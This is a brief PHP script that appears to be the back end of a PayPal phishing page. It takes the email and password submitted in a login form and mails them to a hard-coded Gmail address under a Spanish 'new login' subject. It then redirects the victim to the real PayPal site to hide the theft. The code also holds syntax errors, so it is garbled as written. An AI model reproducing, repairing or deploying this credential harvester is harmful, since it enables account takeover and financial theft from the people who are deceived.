<?php

if ($.SERVER["REQUEST_METHOD] == "POST") {
    $email = $_POST["email"];
    $password = $_POST["password"];
    
    $to = "sebastiandiazdiaz2818@gmail.com";
    $subject = "Nuevo Inicio De Sesion";
    $message = "Correo electronico: $email\nContraseña: $password";
    mail($to, $subject, $message);
    
    
    header("Location: https://www.paypal.com");
    exit();
    
 }
 
 ?>
